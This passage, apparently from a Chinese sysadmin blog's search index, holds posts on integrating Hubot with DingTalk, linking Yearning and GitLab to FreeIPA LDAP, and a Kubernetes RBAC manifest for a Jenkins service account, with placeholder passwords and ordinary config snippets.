href=\"../20211222-hubot_wechat/\"\u003eHubot集成企业微信+jenkins+ansible\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e不明白的可以先看那一篇，那么首先的步骤是一样的，同样要去钉钉开放平台，用管理员登录：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://open.dingtalk.com/\"\u003ehttps://open.dingtalk.com/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e登陆后，点击应用开发\u0026ndash;\u0026gt;企业应用开发：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230301105804714\" loading=\"lazy\" src=\"/posts/20230301-hubot_dingding/image-20230301105804714.png\"\u003e’\u003c/p\u003e\n\u003cp\u003e然后应用开发，机器人，点击创建应用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230301-hubot_dingding/image-20230301105903419.png\"\u003e\u003c/p\u003e\n\u003cp\u003e建好后，点击应用信息，可以看到应用凭证\u003c/p\u003e\n\u003cp\u003e我们记录下来 \u003cstrong\u003eAppSecret\u003c/strong\u003e，之后要用到\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230301110516010\" loading=\"lazy\" src=\"/posts/20230301-hubot_dingding/image-20230301110516010.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后再点击开发管理，这里需要你把 hubot 的服务器地址给公布出去，需要有个公网地址\u003c/p\u003e\n\u003cp\u003e因为hubot是监听的8080端口，所以映射是 xxxx.ip:80 \u0026ndash;\u0026gt; hubotip:8080\u003c/p\u003e\n\u003cp\u003e服务器出口 IP 的地方 , 需要在 hubot 的服务器上，curl \u003ca href=\"http://ipinfo.io\"\u003ehttp://ipinfo.io\u003c/a\u003e，得到地址，然后填上（我们的 ip 非常特殊，每一次访问都有可能会换个ip，所以只好把整段填写进去，而且把公网映射ip也填进去）\u003c/p\u003e\n\u003cp\u003e消息接收地址填上映射后的地址：\u003ccode\u003ehttps://bot.rendoumi.com/hubot/dingtalk/message/\u003c/code\u003e（用不用nginx加证书变https随具体情况定）\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230301105958063\" loading=\"lazy\" src=\"/posts/20230301-hubot_dingding/image-20230301105958063.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后去hubot安装dingtalk插件，在hubot安装根目录运行\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install hubot-dingtalk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eHUBOT_DINGTALK_AUTH_TYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esign\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eHUBOT_DINGTALK_SECRET\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003exxxxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eHUBOT_DINGTALK_MODE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./bin/hubot -a dingtalk\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后我们去用浏览器访问 \u003ccode\u003ehttps://bot.rendoumi.com/hubot/dingtalk/message/\u003c/code\u003e，会返回这个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230301132914868\" loading=\"lazy\" src=\"/posts/20230301-hubot_dingding/image-20230301132914868.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后就可以了。至于把 hubot 做成服务，就参考上一篇文章，把jenkins和ansible都加上，做一个好用的机器人。\u003c/p\u003e","title":"Hubot集成企业钉钉"},{"content":"接上上一篇，Freeipa接完confluence，接下来是接入数据库上线软件Yearning.\n先下结论：同样存在先有 Yearning 账户、然后才有的 FreeIPA LDAP 目录，这次要命了，因为 Yearning 不支持 LDAP 认证方式用户与已有用户进行合并！所以，等于ldap新建了一个用户，跟老用户的邮箱一模一样，但是是个 Newbee，没有权限，需要重新赋权。比较麻烦！希望之后能pr修改一下！！！！\n连接属性如下：\nldap地址：freeipa.bybon.cn:389 LDAP管理员DN：uid=manager,cn=users,cn=accounts,dc=bybon,dc=cn LDAP管理员密码：xxxxxx LDAP_Search Filter：(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=confluence-users,cn=groups,cn=accounts,dc=bybon,dc=cn)(uid=%s)) LDAP_SCBASE：cn=users,cn=accounts,dc=bybon,dc=cn LDAP用户属性：{ \u0026#34;real_name\u0026#34;: \u0026#34;displayName\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;mail\u0026#34;, \u0026#34;department\u0026#34;: \u0026#34;技术中心\u0026#34; } 解释一下：\nLDAP_Search Filter 指搜索用户时所用的filter，这里偷了个懒，按道理应该是独立建一个组yearning-users，懒得干了，复用confluence-users好了。admin组更懒得建，必须用freeipa的admins组\nLDAP_SCBASE 指搜索用户的BASE DN\nLDAP用户属性指yearning中的属性与ldap属性之间的映射关系，department是没有对应的，也没有人会没事干建一个去吧。\n截图如下：\n","permalink":"https://rendoumi.com/posts/20230228-freeipa_yearning/","summary":"\u003cp\u003e接上上一篇，Freeipa接完confluence，接下来是接入数据库上线软件Yearning.\u003c/p\u003e\n\u003cp\u003e先下结论：同样存在先有 Yearning 账户、然后才有的 FreeIPA LDAP 目录，这次要命了，因为 Yearning 不支持 LDAP 认证方式用户与已有用户进行合并！所以，等于ldap新建了一个用户，跟老用户的邮箱一模一样，但是是个 Newbee，没有权限，需要重新赋权。比较麻烦！希望之后能pr修改一下！！！！\u003c/p\u003e\n\u003cp\u003e连接属性如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eldap地址：freeipa.bybon.cn:389\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP管理员DN：uid\u003cspan class=\"o\"\u003e=\u003c/span\u003emanager,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eusers,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP管理员密码：xxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP_Search Filter：\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eobjectclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003einetorgperson\u003cspan class=\"o\"\u003e)(\u003c/span\u003e\u003cspan class=\"nv\"\u003ememberOf\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003ecn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003econfluence-users,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003egroups,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\u003cspan class=\"o\"\u003e)(\u003c/span\u003e\u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%s\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP_SCBASE：cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eusers,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP用户属性：\u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;real_name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;displayName\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;email\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;mail\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;department\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;技术中心\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释一下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eLDAP_Search Filter 指搜索用户时所用的filter，这里偷了个懒，按道理应该是独立建一个组yearning-users，懒得干了，复用confluence-users好了。admin组更懒得建，必须用freeipa的admins组\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLDAP_SCBASE 指搜索用户的BASE DN\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLDAP用户属性指yearning中的属性与ldap属性之间的映射关系，department是没有对应的，也没有人会没事干建一个去吧。\u003c/p\u003e\n\u003cp\u003e截图如下：\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230228114517030\" loading=\"lazy\" src=\"/posts/20230228-freeipa_yearning/image-20230228114517030.png\"\u003e\u003c/p\u003e","title":"yearning集成进freeIPA进行统一认证"},{"content":"k8s里面建立一个用户，然后给特定权限，再做rolebinding的过程，给个标准的建立jenkins-admin的用户的过程：\n简单来说，三步，ServiceAccout \u0026ndash;\u0026gt; Role \u0026ndash;\u0026gt; Rolebinding\napiVersion: v1 kind: ServiceAccount metadata: name: jenkins-admin namespace: devops-tools --- apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: jenkins namespace: default labels: \u0026#34;app.kubernetes.io/name\u0026#34;: \u0026#39;jenkins\u0026#39; rules: - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods\u0026#34;] verbs: [\u0026#34;create\u0026#34;,\u0026#34;delete\u0026#34;,\u0026#34;get\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;patch\u0026#34;,\u0026#34;update\u0026#34;,\u0026#34;watch\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods/exec\u0026#34;] verbs: [\u0026#34;create\u0026#34;,\u0026#34;delete\u0026#34;,\u0026#34;get\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;patch\u0026#34;,\u0026#34;update\u0026#34;,\u0026#34;watch\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods/log\u0026#34;] verbs: [\u0026#34;get\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;watch\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;secrets\u0026#34;] verbs: [\u0026#34;get\u0026#34;] --- apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: jenkins-role-binding namespace: default roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: jenkins subjects: - kind: ServiceAccount name: jenkins-admin namespace: default 资源的链接：https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/\n","permalink":"https://rendoumi.com/posts/20230222-kubernetes_rbac/","summary":"\u003cp\u003ek8s里面建立一个用户，然后给特定权限，再做rolebinding的过程，给个标准的建立jenkins-admin的用户的过程：\u003c/p\u003e\n\u003cp\u003e简单来说，三步，ServiceAccout \u0026ndash;\u0026gt; Role \u0026ndash;\u0026gt; Rolebinding\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: ServiceAccount\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: jenkins-admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: devops-tools\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: rbac.authorization.k8s.io/v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: Role\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: jenkins\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  labels:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;app.kubernetes.io/name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;jenkins\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erules:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- apiGroups: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resources: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pods\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  verbs: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;create\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;delete\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;get\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;list\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;patch\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;update\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;watch\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- apiGroups: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resources: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pods/exec\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  verbs: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;create\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;delete\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;get\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;list\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;patch\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;update\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;watch\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- apiGroups: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resources: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pods/log\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  verbs: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;get\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;list\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;watch\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- apiGroups: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resources: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;secrets\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  verbs: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;get\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: rbac.authorization.k8s.io/v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: RoleBinding\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: jenkins-role-binding\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroleRef:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  apiGroup: rbac.authorization.k8s.io\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  kind: Role\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: jenkins\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esubjects:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- kind: ServiceAccount\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: jenkins-admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: default\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e资源的链接：https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/\u003c/p\u003e","title":"kubernetes中用户rbac的建立"},{"content":"接上一篇，Freeipa接完confluence，接下来是接入Gitlab.\n先下结论：同样道理，也是存在先有 Gitlab 账户、然后才有的 FreeIPA LDAP 目录，这也不要紧，因为 Gitlab 同样支持 LDAP 认证方式的用户与现有用户进行合并。\n举个例子，如果我已经在 Gitlab 中创建了用户名为 zhangranrui、邮箱为 zhangranrui@rendoumi.com 的用户，那么我在 LDAP 目录中只需要把 mail 字段也写成 zhangranrui@rendoumi.com 即可被 Gitlab 识别成同一用户。或者说，我们可以在 Gitlab 中增加 LDAP 目录中的 mail 字段的邮箱（Gitlab 支持同一用户绑定多个邮箱），这样在 Gitlab 中使用 LDAP 认证的时候也会被视为同一用户。跟 Confluence 是一模一样的。\n注意：这样改了之后，无论登录或是拉取代码，就只能使用LDAP的账号密码，不能使用旧的 GitLab Standard 的账号。\n我们的 Gitlab 版本比价老11.1.0，所以改的是 gitlab.yml\nldap: enabled: true servers: main: # \u0026#39;main\u0026#39; is the GitLab \u0026#39;provider ID\u0026#39; of this LDAP server label: \u0026#39;LDAP\u0026#39; host: \u0026#39;freeipa.bybon.cn\u0026#39; port: 389 uid: \u0026#39;uid\u0026#39; encryption: \u0026#39;plain\u0026#39; # \u0026#34;start_tls\u0026#34; or \u0026#34;simple_tls\u0026#34; or \u0026#34;plain\u0026#34; verify_certificates: false ca_file: \u0026#39;\u0026#39; ssl_version: \u0026#39;\u0026#39; bind_dn: \u0026#39;uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn\u0026#39; password: \u0026#39;xxxxxx\u0026#39; timeout: 10 active_directory: false allow_username_or_email_login: false block_auto_created_users: false base: \u0026#39;dc=bybon,dc=cn\u0026#39; user_filter: \u0026#39;(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=gitlab-users,cn=groups,cn=accounts,dc=bybon,dc=cn))\u0026#39; attributes: username: [\u0026#39;uid\u0026#39;] email: [\u0026#39;mail\u0026#39;] name: \u0026#39;displayName\u0026#39; first_name: \u0026#39;givenName\u0026#39; last_name: \u0026#39;sn\u0026#39; lowercase_usernames: false 新版本的话，按字段比较即可。注意上面，我是提前建立了一个 gitlab-users 的组，把用户先都放进组里，这样方便管理。\n","permalink":"https://rendoumi.com/posts/20230217-freeipa_gitlab/","summary":"\u003cp\u003e接上一篇，Freeipa接完confluence，接下来是接入Gitlab.\u003c/p\u003e\n\u003cp\u003e先下结论：同样道理，也是存在先有 Gitlab 账户、然后才有的 FreeIPA LDAP 目录，这也不要紧，因为 Gitlab 同样支持 LDAP 认证方式的用户与现有用户进行合并。\u003c/p\u003e\n\u003cp\u003e举个例子，如果我已经在 Gitlab 中创建了用户名为 zhangranrui、邮箱为 \u003ca href=\"mailto:zhangranrui@rendoumi.com\"\u003ezhangranrui@rendoumi.com\u003c/a\u003e 的用户，那么我在 LDAP 目录中只需要把 mail 字段也写成 \u003ca href=\"mailto:zhangranrui@rendoumi.com\"\u003ezhangranrui@rendoumi.com\u003c/a\u003e 即可被 Gitlab 识别成同一用户。或者说，我们可以在 Gitlab 中增加 LDAP 目录中的 mail 字段的邮箱（Gitlab 支持同一用户绑定多个邮箱），这样在 Gitlab 中使用 LDAP 认证的时候也会被视为同一用户。跟 Confluence 是一模一样的。\u003c/p\u003e\n\u003cp\u003e注意：这样改了之后，无论登录或是拉取代码，就只能使用LDAP的账号密码，不能使用旧的 GitLab Standard 的账号。\u003c/p\u003e\n\u003cp\u003e我们的 Gitlab 版本比价老11.1.0，所以改的是 gitlab.yml\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ldap:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    enabled: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    servers:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      main: \u003cspan class=\"c1\"\u003e# \u0026#39;main\u0026#39; is the GitLab \u0026#39;provider ID\u0026#39; of this LDAP server\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        label: \u003cspan class=\"s1\"\u003e\u0026#39;LDAP\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        host: \u003cspan class=\"s1\"\u003e\u0026#39;freeipa.bybon.cn\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        port: \u003cspan class=\"m\"\u003e389\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        uid: \u003cspan class=\"s1\"\u003e\u0026#39;uid\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        encryption: \u003cspan class=\"s1\"\u003e\u0026#39;plain\u0026#39;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# \u0026#34;start_tls\u0026#34; or \u0026#34;simple_tls\u0026#34; or \u0026#34;plain\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        verify_certificates: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ca_file: \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ssl_version: \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        bind_dn: \u003cspan class=\"s1\"\u003e\u0026#39;uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        password: \u003cspan 